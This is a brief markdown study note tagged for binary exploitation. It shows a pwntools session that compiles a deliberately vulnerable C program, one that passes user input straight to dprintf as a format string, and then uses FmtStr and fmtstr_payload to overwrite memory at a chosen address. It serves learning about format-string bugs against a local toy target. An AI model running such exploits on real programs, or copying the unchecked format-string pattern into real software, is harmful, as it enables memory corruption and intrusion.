---
tags:
- pwn 
- binary

# draft
---


### fmtstr 
```sh
>>> program = tempfile.mktemp()
>>> source  = program + ".c"
>>> write(source, '''
... #include <stdio.h>
... #include <stdlib.h>
... #include <unistd.h>
... #include <sys/mman.h>
... #define MEMORY_ADDRESS ((void*)0x11111000)
... #define MEMORY_SIZE 1024
... #define TARGET ((int *) 0x11111110)
... int main(int argc, char const *argv[])
... {
...        char buff[1024];
...        void *ptr = NULL;
...        int *my_var = TARGET;
...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
...        if(ptr != MEMORY_ADDRESS)
...        {
...                perror("mmap");
...                return EXIT_FAILURE;
...        }
...        *my_var = 0x41414141;
...        write(1, &my_var, sizeof(int *));
...        scanf("%s", buff);
...        dprintf(2, buff);
...        write(1, my_var, sizeof(int));
...        return 0;
... }''')
>>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
>>> process(cmdline).wait_for_close()
>>> def exec_fmt(payload):
...     p = process(program)
...     p.sendline(payload)
...     return p.recvall()
...
>>> autofmt = FmtStr(exec_fmt)
>>> offset = autofmt.offset
>>> p = process(program, stderr=PIPE)
>>> addr = unpack(p.recv(4))
>>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
>>> p.sendline(payload)
>>> print hex(unpack(p.recv(4)))
0x1337babe
```